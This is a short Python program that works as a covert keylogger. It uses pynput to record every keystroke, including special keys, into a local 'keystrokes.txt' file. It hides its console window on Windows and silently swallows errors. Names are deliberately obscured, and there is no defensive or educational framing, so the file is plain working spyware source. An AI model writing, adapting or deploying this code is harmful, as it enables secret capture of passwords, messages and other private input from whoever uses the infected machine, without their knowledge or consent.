import os as _o
from pynput import keyboard as _k

def _w(_k_, _o_):
    try:
        with open(_o_, "a", encoding="utf-8") as _f:
            if _k_ == _k.Key.space:
                _f.write(" ")
            elif _k_ == _k.Key.enter:
                _f.write("\n")
            elif _k_ == _k.Key.backspace:
                _f.write("[BACKSPACE]")
            elif isinstance(_k_, _k.Key):
                _f.write(f"[{_k_.name}]")
            else:
                _f.write(_k_.char)
            _f.flush()
    except:
        pass

def _s(_o_):
    def _p(_k_):
        _w(_k_, _o_)
    with _k.Listener(on_press=_p) as _l:
        _l.join() #papaplayer

def _h():
    if _o.name == "nt":
        import ctypes as _c
        _c.windll.user32.ShowWindow(_c.windll.kernel32.GetConsoleWindow(), 0)

if __name__ == "__main__":
    _h()
    _f = _o.path.join(_o.path.dirname(_o.path.abspath(__file__)), "keystrokes.txt")
    _s(_f)
